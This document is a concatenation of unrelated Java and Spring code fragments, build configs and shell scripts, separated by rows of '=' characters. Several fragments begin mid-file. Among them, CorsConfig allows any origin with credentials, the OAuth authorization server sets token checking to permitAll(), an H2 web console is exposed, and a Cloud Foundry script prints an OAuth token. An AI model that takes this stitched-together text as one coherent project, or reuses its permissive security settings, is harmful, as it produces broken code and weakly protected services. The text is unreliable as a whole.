  provider: releases
  api_key:
    secure: BSI9PlQhhOMXUm2cr8YZs+yT5vX+dLyuPNpx8uvbO1R4TvnT2hZlVt4CDV3iQUNxMF5dD+1NIbZGKfXYk7bH2Ei8AGpiObhl7peFjX9wezqV5aRct2A3eS50mO7uzD3DOt7+6jcpVzTzwiNuzRkWRuSsOocTQc5kE4A5OfcAspY=
  file: 
    - "build/libs/hm2mqtt.jar"
    - "build/distributions/hm2mqtt-addon.tar.gz"
  skip_cleanup: true
  on:
    repo: owagner/hm2mqtt
    tags: true
    all_branches: true
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
    private Pattern toRegexPattern(String subscribedTopic) {
        String regexPattern = subscribedTopic;
        regexPattern = regexPattern.replaceAll("#", ".*");
        regexPattern = regexPattern.replaceAll("\\+", "[^/]*");
        Pattern pattern = Pattern.compile(regexPattern);
        return pattern;
    }
	
import io.prometheus.client.CollectorRegistry;
import io.prometheus.client.hotspot.DefaultExports;
import io.prometheus.client.vertx.MetricsHandler;
import io.vertx.core.AbstractVerticle;
import io.vertx.core.json.JsonObject;
import io.vertx.ext.web.Router;

/**
 * Created by giovanni on 07/07/17.
 */
public class PromMetricsExporter extends AbstractVerticle {
    @Override
    public void start() throws Exception {
        JsonObject conf = config().getJsonObject("prometheus_exporter", new JsonObject());
        int httpPort = conf.getInteger("port", 9100);
        String path = conf.getString("path", "/metrics");

        DefaultExports.initialize();

        Router router = Router.router(vertx);
        router.route(path).handler(new MetricsHandler());
        vertx.createHttpServer().requestHandler(router::accept).listen(httpPort);
    }
}

==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================

#!/bin/bash

#
# Start H2 database and console
#

if [ ! -e ~/tmp/mop.jar ]; then
	wget http://mop.fusesource.org/repo/release/org/fusesource/mop/mop-core/1.0-m1/mop-core-1.0-m1.jar -O ~/tmp/mop.jar
fi


echo "Database URL for tests:"
echo ""
echo " jdbc:h2:target/test-home/database;AUTO_SERVER=TRUE"
echo ""

cd "$( dirname "${BASH_SOURCE[0]}" )"

mkdir -p target/database

java -jar ~/tmp/mop.jar exec com.h2database:h2:1.3.161 org.h2.tools.Console -webPort 8089
==============================================================================================================
git pull upstream master
mvn -DautoVersionSubmodules=true clean package release:prepare
mvn release:perform

   <dependency>
                <groupId>org.testcontainers</groupId>
                <artifactId>testcontainers</artifactId>
                <version>${testcontainers.version}</version>
            </dependency>
     <dependency>
                <groupId>org.testcontainers</groupId>
                <artifactId>junit-jupiter</artifactId>
                <version>${testcontainers.version}</version>
            </dependency>
			
  <dependency>
            <groupId>io.micrometer</groupId>
            <artifactId>micrometer-registry-prometheus</artifactId>
        </dependency>
		
global:
  scrape_interval: 15s
  scrape_timeout: 10s
  evaluation_interval: 15s
alerting:
  alertmanagers:
    - static_configs:
        - targets: []
      scheme: http
      timeout: 10s
scrape_configs:
  - job_name: prometheus
    scrape_interval: 15s
    scrape_timeout: 10s
    metrics_path: /metrics
    scheme: http
    static_configs:
      - targets:
          - localhost:9090
  - job_name: spring-actuator
    scrape_interval: 15s
    scrape_timeout: 10s
    metrics_path: /actuator/prometheus
    scheme: http
    static_configs:
      - targets: ['host.docker.internal:8080'] # works on docker for mac and windows, linux https://github.com/docker/for-linux/issues/264
	

import java.util.concurrent.TimeUnit;

import org.infinispan.Cache;

import io.micrometer.core.instrument.Gauge;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Tag;
import io.micrometer.core.instrument.binder.cache.CacheMeterBinder;

/**
 * Implements {@link CacheMeterBinder} to expose Infinispan embedded metrics
 *
 * @author Katia Aresti, karesti@redhat.com
 * @since 2.1
 */
public class InfinispanCacheMeterBinder extends CacheMeterBinder {

   private final Cache cache;

   public InfinispanCacheMeterBinder(Cache cache, Iterable<Tag> tags) {
      super(cache, cache.getName(), tags);
      this.cache = cache;
   }

   @Override
   protected Long size() {
      if (cache == null) return 0L;

      return cache.getAdvancedCache().getStats().getTotalNumberOfEntries();
   }

   @Override
   protected long hitCount() {
      if (cache == null) return 0L;

      return cache.getAdvancedCache().getStats().getHits();
   }

   @Override
   protected Long missCount() {
      if (cache == null) return 0L;

      return cache.getAdvancedCache().getStats().getMisses();
   }

   @Override
   protected Long evictionCount() {
      if (cache == null) return 0L;

      return cache.getAdvancedCache().getStats().getEvictions();
   }

   @Override
   protected long putCount() {
      if (cache == null) return 0L;

      return cache.getAdvancedCache().getStats().getStores();
   }

   @Override
   protected void bindImplementationSpecificMetrics(MeterRegistry registry) {
      if (cache == null) return;

      Gauge.builder("cache.start", cache, cache -> cache.getAdvancedCache().getStats().getTimeSinceStart())
            .baseUnit(TimeUnit.SECONDS.name())
            .tags(getTagsWithCacheName())
            .description("Time elapsed since start")
            .register(registry);

      Gauge.builder("cache.reset", cache, cache -> cache.getAdvancedCache().getStats().getTimeSinceReset())
            .baseUnit(TimeUnit.SECONDS.name())
            .tags(getTagsWithCacheName())
            .description("Time elapsed since the last statistics reset")
            .register(registry);

      memory(registry);
      averages(registry);
   }

   private void memory(MeterRegistry registry) {
      Gauge.builder("cache.memory.size", cache, cache -> cache.getAdvancedCache().getStats().getCurrentNumberOfEntriesInMemory())
            .tags(getTagsWithCacheName())
            .description("Number of entries currently in the cache, excluding passivated entries")
            .register(registry);

      if (cache.getCacheConfiguration().memory().evictionStrategy().isEnabled()) {
         Gauge.builder("cache.memory.used", cache, cache -> cache.getAdvancedCache().getStats().getDataMemoryUsed())
               .tags(getTagsWithCacheName())
               .description("Provides how much memory the current eviction algorithm estimates is in use for data")
               .register(registry);
      }

      Gauge.builder("cache.memory.offHeap", cache, cache -> cache.getAdvancedCache().getStats().getOffHeapMemoryUsed())
            .tags(getTagsWithCacheName())
            .description("The amount of off-heap memory used by this cache")
            .register(registry);
   }

   private void averages(MeterRegistry registry) {
      Gauge.builder("cache.puts.latency", cache, cache -> cache.getAdvancedCache().getStats().getAverageWriteTime())
            .baseUnit(TimeUnit.MILLISECONDS.name())
            .tags(getTagsWithCacheName())
            .description("Cache puts")
            .register(registry);

      Gauge.builder("cache.gets.latency", cache, cache -> cache.getAdvancedCache().getStats().getAverageReadTime())
            .baseUnit(TimeUnit.MILLISECONDS.name())
            .tags(getTagsWithCacheName())
            .description("Cache gets")
            .register(registry);

      Gauge.builder("cache.removes.latency", cache, cache -> cache.getAdvancedCache().getStats().getAverageRemoveTime())
            .baseUnit(TimeUnit.MILLISECONDS.name())
            .tags(getTagsWithCacheName())
            .description("Cache removes")
            .register(registry);
   }
}

import io.micrometer.core.instrument.binder.cache.JCacheMetrics;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.actuate.metrics.cache.CacheMeterBinderProvider;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.cache.Cache;
import org.springframework.stereotype.Component;

import io.micrometer.core.instrument.Tag;
import io.micrometer.core.instrument.binder.MeterBinder;

/**
 * When actuate dependency is found in the classpath, this component links Infinispan cache metrics with Actuator
 *
 * @author Katia Aresti, karesti@redtat.com
 * @since 2.1
 */
@Component
@Qualifier(InfinispanCacheMeterBinderProvider.NAME)
@ConditionalOnClass(name = "org.springframework.boot.actuate.metrics.cache.CacheMeterBinderProvider")
@ConditionalOnProperty(value = "infinispan.embedded.enabled", havingValue = "true", matchIfMissing = true)
public class InfinispanCacheMeterBinderProvider implements CacheMeterBinderProvider<Cache> {

   public static final String NAME = "infinispanCacheMeterBinderProvider";

   @Override
   public MeterBinder getMeterBinder(Cache cache, Iterable<Tag> tags) {
      Object nativeCache = cache.getNativeCache();
      MeterBinder meterBinder = null;
      if (nativeCache instanceof org.infinispan.Cache) {
         meterBinder = new InfinispanCacheMeterBinder((org.infinispan.Cache) nativeCache, tags);
      } else {
         if (nativeCache instanceof javax.cache.Cache){ // for caches like org.infinispan.jcache.embedded.JCache
            meterBinder = new JCacheMetrics((javax.cache.Cache) nativeCache, tags);
         }
      }
      return meterBinder;
   }
}


private List<Parameter> readParameters(final OperationContext context) {
 List<ResolvedMethodParameter> methodParameters = context.getParameters();
 List<Parameter> parameters = newArrayList();
 for (ResolvedMethodParameter methodParameter : methodParameters) {
  ResolvedType alternate = context.alternateFor(methodParameter.getParameterType());
  if (!shouldIgnore(methodParameter, alternate, context.getIgnorableParameterTypes())) {
   ParameterContext parameterContext = new ParameterContext(methodParameter,
     new ParameterBuilder(),
     context.getDocumentationContext(),
     context.getGenericsNamingStrategy(),
     context);
   if (shouldExpand(methodParameter, alternate)) {
    parameters.addAll(
      expander.expand(
        new ExpansionContext("", alternate, context)));
   } else {
    parameters.add(pluginsManager.parameter(parameterContext));
   }
  }
 }
 return FluentIterable.from(parameters).filter(not(hiddenParams())).toList();
}

==============================================================================================================
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
org.infinispan.spring.starter.embedded.InfinispanEmbeddedAutoConfiguration,\
org.infinispan.spring.starter.embedded.InfinispanEmbeddedCacheManagerAutoConfiguration
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
<plugin>
    <groupId>org.jbehave</groupId>
    <artifactId>jbehave-maven-plugin</artifactId>
    <version>[version]</version>
    <executions>
        <!-- define executions as normal -->
        <metaFilters>
            <metaFilter>"groovy: lang != 'java'"</metaFilter>
        </metaFilters>
    </executions>
    <dependencies>
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>2.4.15</version>
        </dependency>
    </dependencies>
</plugin>

<plugin>
    <groupId>org.jbehave</groupId>
    <artifactId>jbehave-maven-plugin</artifactId>
    <version>[version]</version>
    <executions>
        <!-- define executions as normal -->
    </executions>
    <dependencies>
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.16</version>
        </dependency>
    </dependencies>
</plugin>

<plugin>
    <groupId>org.jbehave</groupId>
    <artifactId>jbehave-maven-plugin</artifactId>
    <version>[version]</version>
    <executions>
        <execution>
            <id>run-stories-as-embeddables</id>
            <phase>integration-test</phase>
            <configuration>
                <includes>
                    <include>**/*Stories.java</include>
                </includes>
                <metaFilters>
                    <metaFilter>+author *</metaFilter>
                    <metaFilter>-skip</metaFilter>
                </metaFilters>
                <systemProperties>
                    <property>
                      <name>java.awt.headless</name>
                      <value>true</value>
                    </property>
                </systemProperties>
                <ignoreFailureInStories>true</ignoreFailureInStories>
                <ignoreFailureInView>false</ignoreFailureInView>
            </configuration>
            <goals>
                <goal>run-stories-as-embeddables</goal>
            </goals>
        </execution>
    </executions>
</plugin>
==============================================================================================================
    <dependency>
      <groupId>org.infinispan</groupId>
      <artifactId>infinispan-core</artifactId>
    </dependency>

    <dependency>
      <groupId>org.infinispan</groupId>
      <artifactId>infinispan-cloud</artifactId>
    </dependency>

    <dependency>
      <groupId>org.infinispan</groupId>
      <artifactId>infinispan-spring4-embedded</artifactId>
    </dependency>

    <dependency>
      <groupId>org.infinispan</groupId>
      <artifactId>infinispan-spring-boot-starter</artifactId>
      <version>${infinispan-spring-boot-starter.version}</version>
      <exclusions>
        <exclusion>
          <groupId>org.infinispan</groupId>
          <artifactId>infinispan-commons</artifactId>
        </exclusion>
        <exclusion>
          <groupId>org.infinispan</groupId>
          <artifactId>infinispan-client-hotrod</artifactId>
        </exclusion>
      </exclusions>
    </dependency>
==============================================================================================================
import org.apache.spark.api.java.JavaPairRDD;
import org.apache.spark.api.java.JavaRDD;
import org.apache.spark.api.java.JavaSparkContext;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import scala.Tuple2;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;

/**
 * Created by achat1 on 9/23/15.
 * Just an example to see if it works.
 */
@Component
public class WordCount {

    @Autowired
    private JavaSparkContext javaSparkContext;

    @Value("${input.file}")
    private String inputFile;

    @Value("${input.threshold}")
    private int threshold;


    public void count() {

        JavaRDD<String> tokenized = javaSparkContext.textFile(inputFile).flatMap((s1) -> Arrays.asList(s1.split(" ")));

        // count the occurrence of each word
        JavaPairRDD<String, Integer> counts = tokenized
                .mapToPair(s -> new Tuple2<>(s, 1))
                .reduceByKey((i1, i2) -> i1 + i2);

        // filter out words with less than threshold occurrences
        JavaPairRDD<String, Integer> filtered = counts.filter(tup -> tup._2() >= threshold);

        // count characters
        JavaPairRDD<Character, Integer> charCounts = filtered.flatMap(
                s -> {
                    Collection<Character> chars = new ArrayList<>(s._1().length());
                    for (char c : s._1().toCharArray()) {
                        chars.add(c);
                    }
                    return chars;
                }
        ).mapToPair(c -> new Tuple2<>(c, 1))
                .reduceByKey((i1, i2) -> i1 + i2);

        System.out.println(charCounts.collect());
    }
}

import org.apache.spark.SparkConf;
import org.apache.spark.api.java.JavaSparkContext;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.core.env.Environment;

/**
 * Created by achat1 on 9/22/15.
 */
@Configuration
@PropertySource("classpath:application.properties")
public class ApplicationConfig {

    @Autowired
    private Environment env;

    @Value("${app.name:jigsaw}")
    private String appName;

    @Value("${spark.home}")
    private String sparkHome;

    @Value("${master.uri:local}")
    private String masterUri;

    @Bean
    public SparkConf sparkConf() {
        SparkConf sparkConf = new SparkConf()
                .setAppName(appName)
                .setSparkHome(sparkHome)
                .setMaster(masterUri);

        return sparkConf;
    }

    @Bean
    public JavaSparkContext javaSparkContext() {
        return new JavaSparkContext(sparkConf());
    }

    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        return new PropertySourcesPlaceholderConfigurer();
    }

}
==============================================================================================================
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JdbcTokenStore;

import javax.sql.DataSource;

/**
 * Created by daz on 01/07/2017.
 */
@Configuration
public class AppConfig {
    
    @Value("${spring.datasource.url}")
    private String datasourceUrl;
    
    @Value("${spring.database.driverClassName}")
    private String dbDriverClassName;
    
    @Value("${spring.datasource.username}")
    private String dbUsername;
    
    @Value("${spring.datasource.password}")
    private String dbPassword;
    
    @Bean
    public DataSource dataSource() {
        final DriverManagerDataSource dataSource = new DriverManagerDataSource();
        
        dataSource.setDriverClassName(dbDriverClassName);
        dataSource.setUrl(datasourceUrl);
        dataSource.setUsername(dbUsername);
        dataSource.setPassword(dbPassword);
        
        return dataSource;
    }
    
    @Bean
    public TokenStore tokenStore() {
        return new JdbcTokenStore(dataSource());
    }
}


import com.dazito.oauthexample.config.AppConfig;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;

/**
 * Created by daz on 27/06/2017.
 */
@EnableAuthorizationServer
@Configuration
public class AuthServerOAuth2Config extends AuthorizationServerConfigurerAdapter {
    
    private final AuthenticationManager authenticationManager;
    private final AppConfig appConfig;
    
    @Autowired
    public AuthServerOAuth2Config(AuthenticationManager authenticationManager, AppConfig appConfig) {
        this.authenticationManager = authenticationManager;
        this.appConfig = appConfig;
    }
    
    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
        clients.jdbc(appConfig.dataSource());
    }
    
    @Override
    public void configure(AuthorizationServerSecurityConfigurer security) throws Exception {
        /*
         * Allow our tokens to be delivered from our token access point as well as for tokens
         * to be validated from this point
         */
        security.checkTokenAccess("permitAll()");
    }
    
    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints
                .authenticationManager(authenticationManager)
                .tokenStore(appConfig.tokenStore()); // Persist the tokens in the database
    }
}
atomicleopard


import com.googlecode.objectify.ObjectifyService;
import edu.monash.monplan.model.Course;
import edu.monash.monplan.model.Unit;
import org.springframework.context.annotation.Configuration;

import javax.annotation.PostConstruct;
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import java.util.Arrays;

@Configuration
public class ObjectifyConfig implements ServletContextListener {

    @PostConstruct
    public void init() {
        registerObjectifyEntities();
    }

    private void registerObjectifyEntities() {
        register(Unit.class);
        register(Course.class);
    }


    private void register(Class<?>... entityClasses) {
        Arrays.stream(entityClasses)
                .forEach(ObjectifyService::register);
    }
    
    @Override
    public void contextInitialized(ServletContextEvent servletContextEvent) {
        registerObjectifyEntities();
    }

    @Override
    public void contextDestroyed(ServletContextEvent servletContextEvent) {

    }

}
==============================================================================================================
/**
 * This class is used as scheduled task which resets the database every 15 minutes to it's initial state.
 *
 * @author Fabian Dietenberger
 */
@Component
class ScheduledDatabaseResetTask {

    private final Logger logger = LoggerFactory.getLogger(ScheduledDatabaseResetTask.class);
    private final TodoItemRepository repository;
    private final SpringBootGwtProperties springBootGwtProperties;

    @Autowired
    public ScheduledDatabaseResetTask(final TodoItemRepository repository, final SpringBootGwtProperties springBootGwtProperties) {
        this.repository = repository;
        this.springBootGwtProperties = springBootGwtProperties;
    }

    @Scheduled(fixedRateString = "${spring-boot-gwt.scheduled-database-reset-interval-millis}")
    public void resetDatabase() {
        if (springBootGwtProperties.isScheduledDatabaseReset()) {
            logger.info("Reset database");

            repository.deleteAll();

            for (final String initialTodoItem : springBootGwtProperties.getInitialTodoItems()) {
                repository.save(new TodoItem(initialTodoItem));
            }

            final List<TodoItem> itemsInDatabase = Optional.ofNullable(repository.findAll()).orElse(Collections.emptyList());
            logger.info("Saved " + itemsInDatabase.size() + " todo items to the database: " + itemsInDatabase.toString());
        }
    }
}
==============================================================================================================
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
public class CorsConfig {

    @Bean
    public FilterRegistrationBean corsFilter() {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.addAllowedOrigin("*");
        config.addAllowedHeader("*");
        config.addAllowedMethod("OPTIONS");
        config.addAllowedMethod("HEAD");
        config.addAllowedMethod("GET");
        config.addAllowedMethod("PUT");
        config.addAllowedMethod("POST");
        config.addAllowedMethod("DELETE");
        config.addAllowedMethod("PATCH");
        source.registerCorsConfiguration("/**", config);
        // return new CorsFilter(source);
        final FilterRegistrationBean bean = new FilterRegistrationBean(new CorsFilter(source));
        bean.setOrder(0);
        return bean;
    }

    @Bean
    public WebMvcConfigurer mvcConfigurer() {
        return new WebMvcConfigurerAdapter() {
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**").allowedMethods("GET", "PUT", "POST", "GET", "OPTIONS");
            }
        };
    }
}

public class MonPlanAssertion {
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_RED = "\u001B[31m";

    public static void assertTrue(boolean condition, String errorMessage) {
        if (!condition) {
            System.out.println(ANSI_RED + "AssertionWarning: " + errorMessage + ANSI_RESET);
        }
    }
}

    @SuppressWarnings("unchecked")
    @Override
    public <In> BigDecimal normalise(TransformerManager transformerManager, In value) {
        Class<In> valueClass = (Class<In>) value.getClass();
        BigDecimal bigDecimalValue = transformerManager.transform(valueClass, BigDecimal.class, value);
        bigDecimalValue = bigDecimalValue.movePointLeft(shift).setScale(shift + scale, RoundingMode.DOWN);
        bigDecimalValue = bigDecimalValue.min(Max).max(Min);
        return bigDecimalValue;
    }
	
==============================================================================================================
    @Bean
    public ServletRegistrationBean h2servletRegistration() {
        ServletRegistrationBean registration = new ServletRegistrationBean(new WebServlet());
        registration.addUrlMappings("/console/*");
        return registration;
    }
==============================================================================================================
import java.util.ArrayList;
import java.util.List;

import javax.annotation.PostConstruct;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.method.support.HandlerMethodReturnValueHandler;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;
import org.springframework.web.servlet.mvc.method.annotation.DeferredResultMethodReturnValueHandler;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter;

@Configuration
public class WebMvcConfiguration extends WebMvcConfigurationSupport {

  @Autowired
  private RequestMappingHandlerAdapter requestMappingHandlerAdapter;

  @Bean
  public HandlerMethodReturnValueHandler completableFutureReturnValueHandler() {
    return new CompletableFutureReturnValueHandler();
  }

  @PostConstruct
  public void init() {
    final List<HandlerMethodReturnValueHandler> originalHandlers = new ArrayList<>(
        requestMappingHandlerAdapter.getReturnValueHandlers());
    
    final int deferredPos = obtainValueHandlerPosition(originalHandlers, DeferredResultMethodReturnValueHandler.class);
    // Add our handler directly after the deferred handler.
    originalHandlers.add(deferredPos + 1, completableFutureReturnValueHandler());
    
    requestMappingHandlerAdapter.setReturnValueHandlers(originalHandlers);
  }

  private int obtainValueHandlerPosition(final List<HandlerMethodReturnValueHandler> originalHandlers, Class<?> handlerClass) {
    for (int i = 0; i < originalHandlers.size(); i++) {
      final HandlerMethodReturnValueHandler valueHandler = originalHandlers.get(i);
      if (handlerClass.isAssignableFrom(valueHandler.getClass())) {
        return i;
      }
    }
    return -1;
  }
}
==============================================================================================================
#!/bin/sh


APP_NAME="bootiful-applications"
DB_SVC_NAME="$APP_NAME-postgresql"
NEWRELIC_SVC_NAME="$APP_NAME-newrelic"
PAPERTRAIL_LOGS_SVC_NAME="$APP_NAME-papertrail-logs"

# tear app and service down if they already exist
cf delete -f $APP_NAME
cf delete-service -f $DB_SVC_NAME
cf delete-service -f $NEWRELIC_SVC_NAME
cf delete-service -f $PAPERTRAIL_LOGS_SVC_NAME

# push the app to the cloud
cf push -p target/demo-0.0.1-SNAPSHOT.jar --random-route $APP_NAME

# give it a backing service
cf services | grep $DB_SVC_NAME || cf create-service elephantsql turtle $DB_SVC_NAME

# bind it to the app
cf bind-service $APP_NAME $DB_SVC_NAME
cf restage $APP_NAME

# scale it
cf scale -i 3 -f $APP_NAME # our free turtle tier PG DB only handles 5 at a time

# watch it auto-heal
URI="`cf a | grep $APP_NAME | tr " " "\n" | grep cfapps.io`"
curl http://$URI/killme
# now watch 'cf apps' reflect auto-healing

# connect to DB
DB_URI=`cf env $APP_NAME | grep postgres: | cut -f2- -d:`;
echo $DB_URI

# lets add New Relic APM
cf create-service newrelic standard $NEWRELIC_SVC_NAME
cf bind-service $APP_NAME $NEWRELIC_SVC_NAME
cf restage $APP_NAME

# lets add a PaperTrail log drain - see https://papertrailapp.com/systems/CloudFoundry/events
PAPERTRAIL_LOG_URL="logs2.papertrailapp.com:49046"
cf create-user-provided-service $PAPERTRAIL_LOGS_SVC_NAME -l syslog://$PAPERTRAIL_LOG_URL
cf bind-service $APP_NAME $PAPERTRAIL_LOGS_SVC_NAME
cf restage $APP_NAME

# make sure we can get back here again
cf create-app-manifest $APP_NAME

# how do we control everything programatically?
echo the OAuth token is `cf oauth-token`
==============================================================================================================
import java.io.Serializable;
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlRootElement;
import javax.xml.bind.annotation.XmlType;

@SuppressWarnings("serial")
@XmlAccessorType(XmlAccessType.FIELD)
@XmlType(name = "person", propOrder = {"name"})
@XmlRootElement(name = "person")
public class Person implements Serializable {

    private String name;

    public Person() {
    }

    public Person(String name) {
        setName(name);
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

}
==============================================================================================================
import org.ocpsoft.prettytime.PrettyTime;

import java.nio.file.Path;

/**
* Created by lh on 28/02/15.
*/
public abstract class AbstractFileProvider implements FileProvider {
    protected static final PrettyTime prettyTime = new PrettyTime();

    protected boolean isArchive(Path path) {
        return isZip(path) || isTarGz(path);
    }

    protected boolean isTarGz(Path path) {
        return !path.toFile().isDirectory() && path.getFileName().toString().endsWith(".tar.gz");
    }

    protected boolean isZip(Path path) {
        return !path.toFile().isDirectory() && path.getFileName().toString().endsWith(".zip");
    }
}
==============================================================================================================
import java.io.InputStream;
import java.util.List;

import javax.annotation.Resource;

import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

@Configuration
public class CitiesInitializer implements InitializingBean {

  @Resource
  private CityDao cityDao;
  @Resource
  private ObjectMapper objectMapper;
  @Value("${sbtfragments.citiesFile}")
  private String citiesFile;

  @Override
  public void afterPropertiesSet() throws Exception {
    org.springframework.core.io.Resource resource = new ClassPathResource(citiesFile);

    List<City> cities;
    try (InputStream inputStream = resource.getInputStream()) {
      cities = objectMapper.readValue(inputStream, new TypeReference<List<City>>() {
      });
    }
    cities.forEach(city -> cityDao.add(city));
  }
}
==============================================================================================================
        <plugin>
          <groupId>org.apache.maven.plugins</groupId>
          <artifactId>maven-enforcer-plugin</artifactId>
          <version>1.4.1</version>
          <executions>
            <execution>
              <id>enforce-mandatory-property</id>
              <goals>
                <goal>enforce</goal>
              </goals>
              <configuration>
                <rules>
                  <requireProperty>
                    <property>apiKey</property>
                    <message>You must pass base64 hash of the apiKey like -DapiKey="base64 encoded api key"
                      Please visit https://www.themoviedb.org/documentation/api for more info.
                    </message>
                    <regex>^[A-Za-z0-9+\/=]*$</regex>
                    <regexMessage>Please pass a valid base64 encoded value for your apiKey</regexMessage>
                  </requireProperty>
                </rules>
                <fail>true</fail>
              </configuration>
            </execution>
          </executions>
        </plugin>
==============================================================================================================
@echo off
REM Copyright (C) 2007 The Android Open Source Project
REM
REM Licensed under the Apache License, Version 2.0 (the "License");
REM you may not use this file except in compliance with the License.
REM You may obtain a copy of the License at
REM
REM     http://www.apache.org/licenses/LICENSE-2.0
REM
REM Unless required by applicable law or agreed to in writing, software
REM distributed under the License is distributed on an "AS IS" BASIS,
REM WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
REM See the License for the specific language governing permissions and
REM limitations under the License.

REM don't modify the caller's environment
setlocal

REM Locate dx.jar in the directory where dx.bat was found and start it.

REM Set up prog to be the path of this script, including following symlinks,
REM and set up progdir to be the fully-qualified pathname of its directory.
set prog=%~f0

rem Check we have a valid Java.exe in the path.
set java_exe=
if exist    "%~dp0..\tools\lib\find_java.bat" call    "%~dp0..\tools\lib\find_java.bat"
if exist "%~dp0..\..\tools\lib\find_java.bat" call "%~dp0..\..\tools\lib\find_java.bat"
if not defined java_exe goto :EOF

set jarfile=dx.jar
set "frameworkdir=%~dp0"
rem frameworkdir must not end with a dir sep.
set "frameworkdir=%frameworkdir:~0,-1%"

if exist "%frameworkdir%\%jarfile%" goto JarFileOk
    set "frameworkdir=%~dp0lib"

if exist "%frameworkdir%\%jarfile%" goto JarFileOk
    set "frameworkdir=%~dp0..\framework"

:JarFileOk

set "jarpath=%frameworkdir%\%jarfile%"

set javaOpts=
set args=

REM By default, give dx a max heap size of 1 gig and a stack size of 1meg.
rem This can be overridden by using "-JXmx..." and "-JXss..." options below.
set defaultXmx=-Xmx1024M
set defaultXss=-Xss1m

REM Capture all arguments that are not -J options.
REM Note that when reading the input arguments with %1, the cmd.exe
REM automagically converts --name=value arguments into 2 arguments "--name"
REM followed by "value". Dx has been changed to know how to deal with that.
set params=

:firstArg
if [%1]==[] goto endArgs
set a=%~1

    if [%defaultXmx%]==[] goto notXmx
    if %a:~0,5% NEQ -JXmx goto notXmx
        set defaultXmx=
    :notXmx

    if [%defaultXss%]==[] goto notXss
    if %a:~0,5% NEQ -JXss goto notXss
        set defaultXss=
    :notXss

    if %a:~0,2% NEQ -J goto notJ
        set javaOpts=%javaOpts% -%a:~2%
        shift /1
        goto firstArg

    :notJ
    set params=%params% %1
    shift /1
    goto firstArg

:endArgs

set javaOpts=%javaOpts% %defaultXmx% %defaultXss%
call "%java_exe%" %javaOpts% -Djava.ext.dirs="%frameworkdir%" -jar "%jarpath%" %params%
==============================================================================================================
